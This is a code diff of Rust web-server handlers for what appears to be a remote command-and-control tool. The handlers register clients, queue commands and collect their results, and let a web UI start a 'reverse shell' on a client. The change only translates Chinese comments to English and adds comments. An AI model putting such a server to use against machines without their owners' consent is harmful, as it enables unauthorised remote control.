@@ -6,12 +6,13 @@ use axum::{
 };
 use common::message::{ClientInfo, CommandRequest, CommandResponse, Message, ShellData};
 
-/// 客户端注册
+/// Client registration handler
 pub async fn register_client(
     State(state): State<AppState>,
     Json(message): Json<Message>,
 ) -> Result<StatusCode, StatusCode> {
     if let Ok(client_info) = serde_json::from_slice::<ClientInfo>(&message.payload) {
+        // Log the client connection and register the client in the client manager
         state.audit_logger.log_client_connect(&client_info);
         state.client_manager.register_client(client_info).await;
         Ok(StatusCode::OK)
@@ -23,7 +24,7 @@ pub async fn register_client(
     }
 }
 
-/// 心跳处理
+/// Heartbeat handler
 pub async fn handle_heartbeat(
     State(state): State<AppState>,
     Json(message): Json<Message>,
@@ -40,7 +41,7 @@ pub async fn handle_heartbeat(
     }
 }
 
-/// 获取客户端命令
+/// Get commands for a specific client
 pub async fn get_commands(
     State(state): State<AppState>,
     Path(client_id): Path<String>,
@@ -49,12 +50,13 @@ pub async fn get_commands(
     Ok(Json(client_commands))
 }
 
-/// 接收命令结果
+/// Handle command result
 pub async fn handle_command_result(
     State(state): State<AppState>,
     Json(message): Json<Message>,
 ) -> Result<StatusCode, StatusCode> {
     if let Ok(result) = serde_json::from_slice::<CommandResponse>(&message.payload) {
+        // Log the command result and add it to the client manager
         state.audit_logger.log_command_result(&result);
         state.client_manager.add_command_result(result).await;
         Ok(StatusCode::OK)
@@ -66,7 +68,7 @@ pub async fn handle_command_result(
     }
 }
 
-/// 处理Shell数据
+/// Handle shell data from clients
 pub async fn handle_shell_data(
     State(state): State<AppState>,
     Json(message): Json<Message>,
@@ -94,25 +96,26 @@ pub async fn handle_shell_data(
     }
 }
 
-/// 发送命令到客户端 (used by web UI)
+/// Send command to a specific client (used by web UI)
 pub async fn send_command(
     State(state): State<AppState>,
     Path(client_id): Path<String>,
     Json(mut cmd): Json<CommandRequest>,
 ) -> Result<StatusCode, StatusCode> {
     cmd.client_id = client_id.clone();
+    // Log the command execution and add it to the client manager
     state.audit_logger.log_command_execution(&cmd);
     state.client_manager.add_command(&client_id, cmd).await;
     Ok(StatusCode::OK)
 }
 
-/// 获取客户端列表API (used by web UI)
+/// Get all clients (used by web UI)
 pub async fn api_clients(State(state): State<AppState>) -> Json<Vec<ClientInfo>> {
     let clients_vec = state.client_manager.get_clients().await;
     Json(clients_vec)
 }
 
-/// 获取命令结果API (used by web UI)
+/// Get command results for a specific client (used by web UI)
 pub async fn api_command_results(
     State(state): State<AppState>,
     Path(client_id): Path<String>,
@@ -121,7 +124,7 @@ pub async fn api_command_results(
     Json(results)
 }
 
-/// 启动反弹Shell (used by web UI)
+/// Initiate a reverse shell for a specific client (used by web UI)
 pub async fn initiate_reverse_shell(
     State(state): State<AppState>,
     Path(client_id): Path<String>,
